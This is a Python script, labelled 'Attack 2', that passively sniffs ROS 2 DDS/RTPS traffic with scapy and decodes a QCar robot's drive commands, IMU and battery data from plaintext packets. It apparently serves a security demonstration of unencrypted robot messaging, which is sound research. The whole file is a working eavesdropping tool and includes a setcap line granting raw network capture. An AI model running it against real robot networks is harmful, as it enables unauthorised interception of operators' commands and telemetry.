#!/usr/bin/env python3
"""
sniffer.py
==========
Attack 2 -- Plaintext Packet Sniffing / Eavesdropping

Passively captures and decodes ROS 2 RTPS messages from the network.
No ROS 2 installation required on the attacker machine -- purely network level.
Demonstrates that cmd_vel, IMU, and battery data are transmitted in plaintext.

Usage:
    sudo python3 sniffer.py
    sudo python3 sniffer.py --iface wlan0 --duration 60
    sudo python3 sniffer.py --iface eth0  --verbose

Requirements:
    pip install scapy
    Must be run as root OR with cap_net_raw capability:
        sudo setcap cap_net_raw,cap_net_admin+eip $(readlink -f $(which python3))
"""

import argparse
import struct
import time
from scapy.all import sniff, UDP, Raw

# ── RTPS constants ─────────────────────────────────────────────────────────────
RTPS_MAGIC = b'RTPS'
DDS_PORT_START = 7400
DDS_PORT_END   = 7600


# ── CDR decoders ──────────────────────────────────────────────────────────────

def decode_twist(payload: bytes):
    """
    geometry_msgs/Twist CDR layout (little-endian):
      bytes 0-3  : CDR header (0x00 0x01 0x00 0x00)
      bytes 4-51 : 6x float64
                   [linear.x, linear.y, linear.z,
                    angular.x, angular.y, angular.z]
    """
    try:
        idx = payload.find(b'\x00\x01\x00\x00')
        if idx == -1 or len(payload) < idx + 52:
            return None
        fields = struct.unpack_from('<6d', payload, idx + 4)
        return {
            'linear_x':  fields[0],   # throttle
            'linear_y':  fields[1],
            'linear_z':  fields[2],
            'angular_x': fields[3],
            'angular_y': fields[4],
            'angular_z': fields[5],   # steering
        }
    except Exception:
        return None


def decode_imu(payload: bytes):
    """
    sensor_msgs/Imu CDR layout (partial -- accel + gyro):
      Orientation quaternion (4x float64) + covariance (9x float64)
      Linear acceleration (3x float64) -- accel x/y/z
      Angular velocity    (3x float64) -- gyro x/y/z
    Total offset from CDR header: (4 + 9 + 3) * 8 = 128 bytes before gyro
    We attempt a simpler scan for two groups of 3 plausible float64 values.
    """
    try:
        idx = payload.find(b'\x00\x01\x00\x00')
        if idx == -1 or len(payload) < idx + 200:
            return None
        # Skip header (4) + orientation (32) + orient_cov (72) = 108 bytes
        offset = idx + 4 + 108
        accel = struct.unpack_from('<3d', payload, offset)
        gyro  = struct.unpack_from('<3d', payload, offset + 24 + 72)
        # Sanity check -- accel z should be near 9.81 at rest
        if abs(accel[2]) < 1.0 or abs(accel[2]) > 30.0:
            return None
        return {'accel': accel, 'gyro': gyro}
    except Exception:
        return None


def decode_battery(payload: bytes):
    """std_msgs/Float32 -- 4 bytes float32 after CDR header."""
    try:
        idx = payload.find(b'\x00\x01\x00\x00')
        if idx == -1 or len(payload) < idx + 8:
            return None
        val = struct.unpack_from('<f', payload, idx + 4)[0]
        if 8.0 < val < 17.0:   # plausible LiPo voltage range
            return val
        return None
    except Exception:
        return None


# ── Packet callback ────────────────────────────────────────────────────────────

stats = {'twist': 0, 'imu': 0, 'battery': 0, 'rtps': 0, 'total': 0}
verbose = False
t_start = time.time()


def packet_callback(pkt):
    if UDP not in pkt or Raw not in pkt:
        return

    sport = pkt[UDP].sport
    dport = pkt[UDP].dport
    if not (DDS_PORT_START <= dport <= DDS_PORT_END or
            DDS_PORT_START <= sport <= DDS_PORT_END):
        return

    payload = bytes(pkt[Raw].load)
    if RTPS_MAGIC not in payload:
        return

    stats['rtps'] += 1
    stats['total'] += 1
    ts = time.strftime('%H:%M:%S')

    # Try Twist (cmd_vel)
    twist = decode_twist(payload)
    if twist and (abs(twist['linear_x']) > 0.001 or abs(twist['angular_z']) > 0.001):
        stats['twist'] += 1
        print(
            f'[{ts}] CMD_VEL CAPTURED '
            f'throttle={twist["linear_x"]:+.3f}  '
            f'steering={twist["angular_z"]:+.3f}  '
            f'src={pkt[UDP].sport}'
        )
        return

    # Try IMU
    imu = decode_imu(payload)
    if imu:
        stats['imu'] += 1
        if verbose:
            a = imu['accel']
            g = imu['gyro']
            print(
                f'[{ts}] IMU CAPTURED  '
                f'accel=[{a[0]:+.2f},{a[1]:+.2f},{a[2]:+.2f}]  '
                f'gyro=[{g[0]:+.3f},{g[1]:+.3f},{g[2]:+.3f}]'
            )
        return

    # Try battery
    batt = decode_battery(payload)
    if batt:
        stats['battery'] += 1
        if verbose:
            print(f'[{ts}] BATTERY CAPTURED  {batt:.2f} V')
        return

    if verbose:
        print(f'[{ts}] RTPS packet  len={len(payload)}  src={pkt[UDP].sport}')


def print_stats():
    elapsed = time.time() - t_start
    print()
    print('=' * 55)
    print('  Sniffer Summary')
    print('=' * 55)
    print(f'  Duration       : {elapsed:.1f}s')
    print(f'  RTPS packets   : {stats["rtps"]}')
    print(f'  cmd_vel decoded: {stats["twist"]}')
    print(f'  IMU decoded    : {stats["imu"]}')
    print(f'  Battery decoded: {stats["battery"]}')
    print('=' * 55)
    print()
    if stats['twist'] > 0:
        print('  RESULT: Drive commands successfully captured in plaintext.')
        print('  An attacker can reconstruct operator intent from passive capture.')
    else:
        print('  No cmd_vel packets decoded.')
        print('  Make sure the operator is driving the QCar while sniffing.')


def main():
    global verbose
    ap = argparse.ArgumentParser(
        description='Attack 2: Plaintext ROS 2 packet sniffer')
    ap.add_argument('--iface',    default=None,
                    help='Network interface (e.g. wlan0, eth0). Default: auto')
    ap.add_argument('--duration', type=float, default=30.0,
                    help='Capture duration in seconds (default: 30)')
    ap.add_argument('--verbose',  action='store_true',
                    help='Show all decoded packets including IMU and battery')
    args = ap.parse_args()
    verbose = args.verbose

    print()
    print('=' * 55)
    print('  Attack 2: Plaintext Packet Sniffing')
    print('=' * 55)
    print(f'  Interface : {args.iface or "auto"}')
    print(f'  Duration  : {args.duration:.0f}s')
    print(f'  Filter    : UDP ports {DDS_PORT_START}-{DDS_PORT_END} (DDS/RTPS)')
    print('  Have the operator drive the QCar during capture.')
    print('  Press Ctrl+C to stop early.')
    print('=' * 55)
    print()

    try:
        sniff(
            filter=f'udp portrange {DDS_PORT_START}-{DDS_PORT_END}',
            iface=args.iface,
            prn=packet_callback,
            store=False,
            timeout=args.duration,
        )
    except KeyboardInterrupt:
        pass
    finally:
        print_stats()


if __name__ == '__main__':
    main()
